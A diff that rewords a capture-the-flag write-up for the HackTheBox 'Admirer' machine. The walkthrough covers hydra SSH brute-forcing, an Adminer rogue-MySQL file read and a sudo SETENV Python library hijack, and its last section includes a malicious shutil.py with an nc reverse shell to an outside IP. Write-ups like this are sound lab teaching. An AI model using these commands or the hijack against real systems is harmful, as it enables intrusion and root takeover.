@@ -6,18 +6,18 @@ points: 20
 rating: 3.5
 date: 2020-05-02
 avatar: assets/htb/admirer.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Admirer
 ---
+
 ## Overview
 
-An easy difficulty Linux machine that has an interesting take on database manipulation to obtain a local file inclusion vulnerability.  It also has an interesting new \(to me\) way to leverage sudo privileges to gain privilege escalation.  In all, this was a fun machine that taught me some interesting new tricks!
+This easy Linux box features a clever database-manipulation trick that yields a local file inclusion vulnerability.  It also showed me a new-to-me method of abusing sudo privileges for privilege escalation.  Overall, an enjoyable machine that taught me a couple of fresh techniques!
 
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I kicked off enumeration with an nmap scan of `<YOUR_IP>`. The flags I typically rely on are: `-p-`, a shorthand that instructs nmap to scan every port, `-sC`, which is equivalent to `--script=default` and launches nmap's default set of enumeration scripts against the host, `-sV` for service detection, and `-oA <name>` to save the output under the filename `<name>`.
 
 ```text
 kac0@kali:~/htb/admirer$ nmap -p- -sCV -oA admirer <YOUR_IP>
@@ -42,7 +42,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 51.54 seconds
 ```
 
-Looking at the results of my nmap scan I saw that only ports 21 \(FTP\), 22 \(SSH\), and 80 \(HTTP\) were open.  
+The scan results showed that just three ports were open: 21 \(FTP\), 22 \(SSH\), and 80 \(HTTP\).  
 
 ```text
 kac0@kali:~/htb/admirer$ ftp <YOUR_IP>                                                      
@@ -53,21 +53,21 @@ Name (<YOUR_IP>:kac0): anonymous
 Login failed.
 ```
 
-I started out by trying to log into FTP, but it did not allow anonymous access.
+My first move was to attempt an FTP login, but anonymous access was rejected.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-admirer-website.png)
+![](assets/wu/admirer/img-1.png)
 
-Next, I opened a browser to see what was being hosted over HTTP and found a website of someone who was an "Admirer of skills and visuals".  There did not seem to be anything useful on the site itself.
+Next I pointed a browser at the HTTP service to see what was hosted there, landing on a site belonging to someone who described themselves as an "Admirer of skills and visuals".  Nothing on the page itself looked useful.
 
 ### robots.txt
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-robots.txt.png)
+![](assets/wu/admirer/img-2.png)
 
-Nmap pointed out that there was a `robots.txt` file, so I checked it out.  I found a potential username `waldo` and also a folder `admin-dir`.  
+Since nmap had flagged a `robots.txt` file, I took a look.  It revealed a likely username `waldo` along with a folder named `admin-dir`.  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-dirbuster.png)
+![](assets/wu/admirer/img-3.png)
 
-Navigating directly to that page gave me an access forbidden error, so I fired up Dirbuster and ran it on this directory.  This led me to a few useful sounding files: `contacts.txt` and `credentials.txt`. 
+Browsing straight to that page returned a forbidden error, so I launched Dirbuster against the directory.  That turned up a couple of promising files: `contacts.txt` and `credentials.txt`. 
 
 ```text
 ##########
@@ -98,7 +98,7 @@ Email: h.helberg@admirer.htb
 Email: b.rauch@admirer.htb
 ```
 
-The file `contacts.txt` contained some more potential usernames and a potentially useful email address format. I also noticed that `waldo` seemed to be a fan of The Big Bang Theory tv show, which could also be useful information. 
+`contacts.txt` held additional candidate usernames and revealed the email address format in use. I also spotted that `waldo` appeared to be a fan of The Big Bang Theory, another detail that might come in handy. 
 
 ```text
 [Internal mail account]
@@ -114,11 +114,11 @@ admin
 w0rdpr3ss01!
 ```
 
-`credentials.txt` contained credentials for a few services, so I added them to my `users` and `passwords` files.  
+`credentials.txt` listed logins for several services, which I dropped into my `users` and `passwords` files.  
 
 ## Initial Foothold
 
-Next I used `hydra` to attempt a brute-force attack against SSH to see if any of the credentials would allow me to log in.
+I then turned to `hydra` to brute-force SSH and check whether any of the collected credentials would grant a login.
 
 ```text
 kac0@kali:~/htb/admirer$ hydra -L users -P passwords <YOUR_IP> ssh
@@ -133,7 +133,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-04 15:40:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-04 15:40:38
 ```
 
-The FTP credentials seemed to also work for SSH! However, the connection was closed immediately upon logging in.  After trying various ways to bypass this and failing, I moved on to try the credentials for FTP instead.
+The FTP credentials worked over SSH too! Unfortunately, the session was dropped the instant I logged in.  After several unsuccessful attempts to get around this, I shifted to using the credentials against FTP itself.
 
 ```text
 kac0@kali:~/htb/admirer$ ftp <YOUR_IP>
@@ -153,39 +153,39 @@ ftp> dir
 226 Directory send OK.
 ```
 
-Using the ftp credentials, I was able to log into the FTP server.  I found a few interesting files and exfiltrated them back to my machine for analysis.
+The ftp credentials let me into the FTP server.  I spotted a couple of interesting files and pulled them back to my box for analysis.
 
 ### The database backup
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.1-database.png)
+![](assets/wu/admirer/img-4.png)
 
-The file `dump.sql` contained a dump of the website database. Unfortunately,  it seemed as if the only useful information was the server version information and the database name and the name of a deleted table that looked to contain website files. I thought that this information could come in handy so I made note of it.
+`dump.sql` was a dump of the site's database. The only worthwhile details, though, looked to be the server version, the database name, and the name of a deleted table that appeared to hold website files. I figured that might prove useful later, so I jotted it down.
 
 * **Database:** admirerdb
 * **Table**: items \(deleted\)
 * **Version**: MySQL dump 10.16 Distrib 10.1.41-MariaDB, for debian-linux-gnu \(x86\_64\)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.1-database2.png)
+![](assets/wu/admirer/img-5.png)
 
-The `Employees3` table had another list of potential usernames and email addresses that I added to my lists.
+The `Employees3` table held yet another set of candidate usernames and email addresses, which I appended to my lists.
 
 ### Back-end code backup
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.2-html.png)
+![](assets/wu/admirer/img-6.png)
 
-After fully checking out the database, I moved on to the file `html.tar.gz`. I decompressed the tar file with `gunzip` and found that it contained a backup of the website's back-end code, including a very interesting PHP file called `admin_tasks.php` in the `/utility-scripts/` folder. 
+Once I had fully reviewed the database, I turned to `html.tar.gz`. Extracting the tar archive with `gunzip` revealed a backup of the site's back-end code, including a particularly interesting PHP file named `admin_tasks.php` under the `/utility-scripts/` folder. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.5-admintasks.png)
+![](assets/wu/admirer/img-7.png)
 
-This file looked like a nice little backdoor that the admin had left for me called the "Admin Tasks Web Interface \(v0.01 beta\)". I was very interested in options 4 through 7, which could potentially give me very sensitive system information.  
+This file looked like a handy little backdoor the admin had conveniently left behind, dubbed the "Admin Tasks Web Interface \(v0.01 beta\)". Options 4 through 7 caught my eye, as they might hand over highly sensitive system information.  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.6-db_admin.png)
+![](assets/wu/admirer/img-8.png)
 
-in the same folder was `db_admin.php` which contained another set of credentials, this time for the user `waldo` who I had seen in the `robots.txt`. 
+The same folder held `db_admin.php`, which carried yet another set of credentials, this time for the user `waldo` I had earlier seen in `robots.txt`. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.7-indexphp.png)
+![](assets/wu/admirer/img-9.png)
 
-There was also another password for `waldo` in the `index.php` file.  This also referenced the `items` table that had been deleted from the database I exfiltrated.  If I could get a web shell into this table, the page would run it for me when the page loaded.
+The `index.php` file also held another password for `waldo`.  It referenced the `items` table too, the one that had been deleted from the database I downloaded.  If I could plant a web shell into that table, the page would execute it for me on load.
 
 ```text
 User-agent: *
@@ -194,7 +194,7 @@ User-agent: *
 Disallow: /w4ld0s_s3cr3t_d1r
 ```
 
-Inside this HTML backup was a different version of the `robots.txt`.  This time the disallowed folder was called `/w4ld0s_s3cr3t_d1r/`, which I had access to as a folder in the backup.  This folder contained the files `contacts.txt` and `credentials.txt` which appeared at first to be the same as before.
+The HTML backup also contained a different copy of `robots.txt`.  Here the disallowed folder was `/w4ld0s_s3cr3t_d1r/`, which I could access directly as a folder within the backup.  Inside it sat `contacts.txt` and `credentials.txt`, which at first glance looked identical to the earlier ones.
 
 ```text
 [Bank Account]
@@ -214,38 +214,38 @@ admin
 w0rdpr3ss01!
 ```
 
-The `credentials.txt` had most of the same information as before, but `waldo` seemed to have left his bank account password in this one.  Despite finding a couple more passwords, none of these worked for logging into SSH for any user.
+This `credentials.txt` largely repeated the earlier content, except `waldo` had apparently left his bank account password in this version.  Even with these extra passwords in hand, none of them logged in over SSH for any user.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-admin-tasks.png)
+![](assets/wu/admirer/img-10.png)
 
-I navigated to `http://<YOUR_IP>/utility-scripts/admin_tasks.php` which brought me to a website for running administrative tasks on the server.  
+Browsing to `http://<YOUR_IP>/utility-scripts/admin_tasks.php` landed me on a page for running administrative tasks against the server.  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.9-admin-tasks.png)
+![](assets/wu/admirer/img-11.png)
 
-I didn't find much useful other than the fact that the page was running in the context of the `www-data` user. 
+There wasn't much of value here beyond confirming that the page ran as the `www-data` user. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.8-admin-tasks.png)
+![](assets/wu/admirer/img-12.png)
 
-I tried to run the disabled scripts, which gave the message:  `Insufficient privileges to perform the selected operation.`
+Attempting to invoke the disabled scripts just returned the message:  `Insufficient privileges to perform the selected operation.`
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-adminer.png)
+![](assets/wu/admirer/img-13.png)
 
-After I checked back on my Dirbuster scan of the `/utility-scripts/` folder, I noticed it had found a new page `adminer.php` where I found an adminer database management portal. 
+Returning to my Dirbuster scan of the `/utility-scripts/` folder, I saw it had discovered a new page, `adminer.php`, which hosted an Adminer database management portal. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-adminer.png)
+![](assets/wu/admirer/img-14.png)
 
-I noticed the version was 4.6.2, though the page said right next to it that there was a version 4.7.7 available to download. A search for adminer 4.6.2 exploit brought me to [https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability](https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability). This led to [https://sansec.io/research/sites-hacked-via-mysql-protocal-flaw](https://sansec.io/research/sites-hacked-via-mysql-protocal-flaw), which in turn linked to a MySQL exploit on GitHub at [https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue\_mysql\_server.py](https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py).  I also found a few other references that gave a pretty clear picture of how to exploit this particular web SQL management portal.
+The version showed as 4.6.2, with a note right beside it that version 4.7.7 was available for download. Searching for an adminer 4.6.2 exploit led me to [https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability](https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability). That pointed to [https://sansec.io/research/sites-hacked-via-mysql-protocal-flaw](https://sansec.io/research/sites-hacked-via-mysql-protocal-flaw), which in turn referenced a MySQL exploit on GitHub at [https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue\_mysql\_server.py](https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py).  A few additional references rounded out a clear understanding of how to attack this web-based SQL management portal.
 
 * [https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool) 
 * [https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f](https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f)
 
-To sum all of this up, the easiest way to exploit this portal is to set up a local MySQL database and have the remote server connect to it.  I found instructions for how to do this at [https://www.microfocus.com/documentation/idol/IDOL\_12\_0/MediaServer/Guides/html/English/Content/Getting\_Started/Configure/\_TRN\_Set\_up\_MySQL\_Linux.htm](https://www.microfocus.com/documentation/idol/IDOL_12_0/MediaServer/Guides/html/English/Content/Getting_Started/Configure/_TRN_Set_up_MySQL_Linux.htm)
+In short, the simplest path to exploiting this portal is to stand up a local MySQL database and make the remote server connect back to it.  I located setup instructions at [https://www.microfocus.com/documentation/idol/IDOL\_12\_0/MediaServer/Guides/html/English/Content/Getting\_Started/Configure/\_TRN\_Set\_up\_MySQL\_Linux.htm](https://www.microfocus.com/documentation/idol/IDOL_12_0/MediaServer/Guides/html/English/Content/Getting_Started/Configure/_TRN_Set_up_MySQL_Linux.htm)
 
 ## Road to User
 
 ### The rogue MySQL server
 
-I did a bit more research to figure out exactly how to set up the MySQL database.  The following articles gave me the last bits of information I didn't already know \(specifically, how to create a user and assign it permissions\).
+I dug a little deeper to work out exactly how to configure the MySQL database.  The articles below filled in the remaining gaps I wasn't already familiar with \(specifically, creating a user and granting it permissions\).
 
 * [https://www.liquidweb.com/kb/create-a-mysql-user-on-linux-via-command-line/](https://www.liquidweb.com/kb/create-a-mysql-user-on-linux-via-command-line/) 
 * [https://www.liquidweb.com/kb/grant-permissions-to-a-mysql-user-on-linux-via-command-line/](https://www.liquidweb.com/kb/grant-permissions-to-a-mysql-user-on-linux-via-command-line/)
@@ -296,7 +296,7 @@ root@kalimaa:~# exit
 logout
 ```
 
-After creating the database and a table called `admirer`, I created a user named `test` and gave it full permissions to manage the database.  
+Having created the database and a table called `admirer`, I added a user named `test` and granted it full rights to manage the database.  
 
 ```text
 kac0@kali:/etc/mysql/mariadb.conf.d$ ls
@@ -304,22 +304,22 @@ kac0@kali:/etc/mysql/mariadb.conf.d$ ls
 kac0@kali:/etc/mysql/mariadb.conf.d$ sudo vim 50-server.cnf
 ```
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5.5-config-file.png)
+![](assets/wu/admirer/img-15.png)
 
-Next I had to set the binding for the server to the address `0.0.0.0` so that the external service could connect to it by my IP.  The default is `127.0.0.1` which is localhost only.
+Next I needed to bind the server to `0.0.0.0` so the remote service could reach it via my IP.  The default `127.0.0.1` only listens on localhost.
 
 ```text
 kac0@kali:/etc/mysql/conf.d$ service mysql stop
 kac0@kali:/etc/mysql/conf.d$ service mysql start
 ```
 
-After changing the server `bind-address` setting to `0.0.0.0` I had to restart the `mysql` service for it to take effect. After that I was able to login to my database in the Adminer portal.
+After switching the server's `bind-address` to `0.0.0.0`, I restarted the `mysql` service so the change would take effect. From there I could log into my database through the Adminer portal.
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-adminer-login%2520%25281%2529.png)
 
 ### Finding user creds
 
-This bug bounty write-up detailed what I needed to do next. Essentially, I logged into the remote server's database management portal, but it was my own local database that I logged into.  After that, I abused a feature of MySQL that allows for local files to be imported into the database.  This is a type of local file inclusion \(LFI\) vulnerability.  
+This bug bounty write-up laid out the next steps. In essence, I used the remote server's database management portal but connected it to my own local database.  Then I abused a MySQL feature that imports local files into the database, which is effectively a local file inclusion \(LFI\) vulnerability.  
 
 * [https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f](https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f)
 
@@ -331,15 +331,15 @@ FIELDS TERMINATED BY "\n"
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-failed-local-inclusion%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25281%2529.png)
 
-To test for the local file inclusion vulnerability I first tried to get `/etc/passwd` but was denied access to that file. Since I was fairly sure that this portal was still only running in the context of `www-data` I decided to try to get a file I knew I could access: `index.php`.
+To test the local file inclusion, I first went after `/etc/passwd` but was denied access to it. Reasonably confident the portal was still running as `www-data`, I switched to a file I knew I could read: `index.php`.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-local-inclusion-success.png)
+![](assets/wu/admirer/img-18.png)
 
-I wasn't even sure that this was going to work, but to my surprise it retrieved the file and added it to my database. I now had a way to read through the source code of the production website as opposed to the backups I downloaded earlier.
+I wasn't certain it would work, but to my surprise the file was pulled in and stored in my database. I now had a way to read the live production website's source code rather than just the backups I'd downloaded earlier.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-yet-another-password.png)
+![](assets/wu/admirer/img-19.png)
 
-Much to my surprise...there was yet again another password contained in this file. Before trying to download any more files I decided to try to brute force SSH login again with this new password.
+Much to my surprise...this file held yet another password. Before grabbing any more files, I decided to retry the SSH brute force with this newly found password.
 
 ```text
 kac0@kali:~/htb/admirer$ hydra -L users -P passwords <YOUR_IP> ssh
@@ -355,7 +355,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-04 22:49:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-04 22:50:00
 ```
 
-I had finally found a usable password for `waldo`!  I hoped that it wouldn't just kick me out like it had with `ftpuser`. 
+At last I had a working password for `waldo`!  I just hoped it wouldn't immediately disconnect me the way it had with `ftpuser`. 
 
 ### User.txt
 
@@ -379,7 +379,7 @@ waldo@admirer:~$ cat user.txt
 e9d4************************af9a
 ```
 
-Luckily it logged me right in, and I was able to collect my hard-earned loot!
+Fortunately it let me straight in, and I could finally grab my hard-earned loot!
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -399,7 +399,7 @@ User waldo may run the following commands on admirer:
     (ALL) SETENV: /opt/scripts/admin_tasks.sh
 ```
 
-One of the first things I always do when gaining access to a new user is to check what privileges I have with `sudo -l`.  I was pleasantly surprised to get a result back that I was able to do something with a bash script called `admin_tasks.sh`.  I was curious about what this script did, and also what the group `admins` could access.  
+One of my first habits after landing on a new user is to run `sudo -l` to see what privileges I hold.  I was pleased to find I could do something with a bash script named `admin_tasks.sh`.  Naturally I wanted to know what that script did, and also what the `admins` group had access to.  
 
 ```text
 waldo@admirer:~$ find / -group admins 2>/dev/null
@@ -408,7 +408,7 @@ waldo@admirer:~$ find / -group admins 2>/dev/null
 /opt/scripts/admin_tasks.sh
 ```
 
-Hmm...so the admins group only has access to this `scripts` folder.  Time to check out the bash script.
+Hmm...so the admins group only has access to that `scripts` folder.  Time to inspect the bash script.
 
 ```bash
 #!/bin/bash
@@ -530,7 +530,7 @@ done
 exit 0
 ```
 
-This bash script seemed to be a completed version of the PHP version of admin-tasks I had seen earlier.  Inside the script it references a few other files:
+This bash script looked like a finished counterpart to the PHP admin-tasks page I had seen before.  Within it, a few other files are referenced:
 
 * `/opt/scripts/backup.py`
 * `/srv/ftp/dump.sql` - _this is the one I found through the ftp server I think_
@@ -575,7 +575,7 @@ Choose an option: 3
 */3 * * * * rm /home/waldo/*.p* >/dev/null 2>&1
 ```
 
-I ran the option for viewing the root crontab and noticed that it was set to clear out files every 3 minutes.  It looked like putting files in `/tmp/` or files with an extension starting in `p` in `waldo`'s home directory would be a short-lived affair.  
+I selected the option to view the root crontab and saw it was configured to wipe files every 3 minutes.  Clearly, anything placed in `/tmp/`, or any file whose extension begins with `p` in `waldo`'s home directory, wouldn't last long.  
 
 ```text
 waldo@admirer:/opt/scripts$ ls -la /var/backups/
@@ -609,7 +609,7 @@ drwxr-xr-x 12 root root      4096 Nov 29  2019 ..
 -rw-------  1 root shadow    1777 Apr 22 11:42 shadow.bak
 ```
 
-I was also able to run the script to backup the SQL database, `/etc/passwd`, and `/etc/shadow`. Unfortunately, each of the backup files were owned by `root` so I had no way to read them.  
+I could also run the script to back up the SQL database, `/etc/passwd`, and `/etc/shadow`. Unfortunately every resulting backup file was owned by `root`, leaving me no way to read them.  
 
 ```bash
 backup_web()
@@ -624,7 +624,7 @@ backup_web()
 }
 ```
 
-The one function that looked a bit different from the others was the one that backed up the HTML files for the website.  This one called a separate python script, which would also be run as root, so I decided to check it out as well.
+The one function that stood out from the rest was the one backing up the website's HTML files.  It invoked a separate python script that would likewise execute as root, so I decided to examine it too.
 
 ```python
 !/usr/bin/python3
@@ -641,13 +641,13 @@ dst = '/var/backups/html'
 make_archive(dst, 'gztar', src)
 ```
 
-The file `/opt/scripts/backup.py` that the bash script referenced to do the web backup contained code that seemed potentially useful. 
+The `/opt/scripts/backup.py` file that the bash script called for the web backup contained code that looked potentially exploitable. 
 
 ### SETENV and sudo
 
-I had an idea that since this python script was being run as root that maybe I could get it to read a file of my choice, however all of the files referenced in the python script has absolute paths so no no hijacking seemed possible there. 
+Since the python script ran as root, I wondered if I could coax it into reading a file of my choosing, but every file path in the script was absolute, so there was no opportunity to hijack them. 
 
-I did some research for `sudo setenv python` since I saw in my `sudo -l` output the word `SETENV` listed in front of the bash script I could run. In the search results was a very interesting article that talked about hijacking python library imports. 
+Because the `sudo -l` output showed `SETENV` preceding the bash script I was allowed to run, I researched `sudo setenv python`. Among the results was a compelling article about hijacking python library imports. 
 
 * [https://stackoverflow.com/questions/7969540/pythonpath-not-working-for-sudo-on-gnu-linux-works-for-root](https://stackoverflow.com/questions/7969540/pythonpath-not-working-for-sudo-on-gnu-linux-works-for-root) [https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)
 
@@ -657,7 +657,7 @@ I did some research for `sudo setenv python` since I saw in my `sudo -l` output 
 >
 > It can be abused if the user got privileges to set or modify that variable, usually through a script that can run with sudo permissions and got the SETENV tag set into /etc/sudoers file.
 
-This sounded exactly like the situation I had found.
+That described my situation precisely.
 
 ```python
 import os
@@ -667,7 +667,7 @@ def make_archive():
     os.system('echo I am g`whoami`')
 ```
 
-Armed with this information, I wrote a short python library to replace the one referenced in the script.  I named it `shutil.py` so the script would call it instead of the real one, and also made a function named `make_archive()` since this was what was specifically being imported.  I wrote my function so that it would create a bash shell, and then echo my new username.  
+With that in mind, I crafted a small python library to stand in for the one the script imports.  I called it `shutil.py` so the script would load mine instead of the genuine module, and defined a `make_archive()` function since that was the exact name being imported.  My function was written to spawn a bash shell and then echo my new username.  
 
 ```python
 waldo@admirer:/dev/shm$ vi shutil.py 
@@ -706,9 +706,9 @@ Running backup script in the background, it might take a while...
 waldo@admirer:/dev/shm$ I am groot
 ```
 
-After trial and error, I was able to get my library to be loaded and executed, though I did not get a shell like I expected. However, I could see that the output of the `whoami` command did appear, so I had proof that I could run commands as root. 
+After some trial and error, I got my library to load and run, though it didn't drop me into a shell as I'd hoped. Still, the `whoami` output showed up, proving I could execute commands as root. 
 
-I got an error when trying to exploit this with version one of my evil python library, but that error also confirmed that I was making progress. It told me that my `make_archive()` function takes 0 positional arguments but the script that was calling it was feeding it three.
+The first version of my malicious python library threw an error, but that error was itself a sign of progress. It reported that my `make_archive()` function accepts 0 positional arguments while the calling script was passing it three.
 
 ```python
 import os
@@ -719,7 +719,7 @@ def make_archive(a, b, c):
     os.system('nc 10.10.15.57 12345 -e /bin/bash')
 ```
 
-I modified my function to take 3 arguments \(which I didn't use for anything\), and also added a line to send me a reverse shell since calling a new shell wasn't working, and then it worked just fine. I didn't expect the version of `nc` that was installed to have `-e` capability, but I was happy it did!
+I updated the function to accept 3 arguments \(which I never actually used\) and, since spawning a local shell wasn't working, added a line to fire a reverse shell back to me, after which everything worked smoothly. I hadn't expected the installed `nc` to support `-e`, but I was glad it did!
 
 ```python
 waldo@admirer:/dev/shm$ nano shutil.py 
